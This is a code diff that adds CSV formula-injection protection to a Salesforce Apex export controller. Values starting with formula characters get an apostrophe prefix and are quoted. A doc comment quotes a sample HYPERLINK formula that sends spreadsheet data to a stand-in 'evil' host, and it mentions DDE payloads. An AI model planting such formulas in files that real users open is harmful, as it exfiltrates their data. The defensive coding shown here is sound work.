@@ -25,6 +25,7 @@ public with sharing class EventExportController {
     private static final String EVENT_HEADER = 'Event,Event Date,';
     private static final String CONTACT_HEADER = 'Name,Title,Account,Email,Approved By,Decided At';
     private static final String APPROVED_STATUSES = '(\'Approved\', \'Exported\')';
+    private static final Set<String> FORMULA_TRIGGERS = new Set<String>{ '=', '+', '-', '@', '\t', '\r' };
 
     private static final String ROW_FIELDS =
         'Id, Status__c, Decided_At__c, Marketing_Event__c, ' +
@@ -261,11 +262,39 @@ public with sharing class EventExportController {
         return name.replaceAll('[^a-zA-Z0-9 _-]', '').replace(' ', '_');
     }
 
+    /**
+     * Quoting, plus CSV formula injection defence.
+     *
+     * Every value in the file is Salesforce data an AM can set (a Contact Title, an
+     * Account name, an event name) or that arrives through the .xlsx import, so a cell
+     * opening with =, +, - or @ is attacker-controllable. Excel and LibreOffice evaluate
+     * such a cell on open — `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the
+     * neighbouring row on a single click, and DDE payloads go further. Prefixing with an
+     * apostrophe forces the spreadsheet to read the value as text; the cell is then always
+     * quoted so the apostrophe cannot be confused with a delimiter.
+     *
+     * Trade-off: the apostrophe is visible in some spreadsheet/import combinations. That
+     * is acceptable here because every exported column is text (names, titles, emails,
+     * formatted timestamps) — no legitimate value is a negative number that would be
+     * damaged by the guard.
+     */
+    @TestVisible
     private static String csvCell(String value) {
         if (value == null) { return ''; }
-        if (value.contains(',') || value.contains('"') || value.contains('\n') || value.contains('\r')) {
-            return '"' + value.replace('"', '""') + '"';
+        Boolean guarded = isFormulaLike(value);
+        String safe = guarded ? '\'' + value : value;
+        if (guarded || safe.contains(',') || safe.contains('"') || safe.contains('\n') || safe.contains('\r')) {
+            return '"' + safe.replace('"', '""') + '"';
         }
-        return value;
+        return safe;
+    }
+
+    /**
+     * Leading characters a spreadsheet treats as the start of a formula. Tab and CR are
+     * included because Excel skips them before parsing what follows.
+     */
+    private static Boolean isFormulaLike(String value) {
+        if (String.isEmpty(value)) { return false; }
+        return FORMULA_TRIGGERS.contains(value.substring(0, 1));
     }
 }
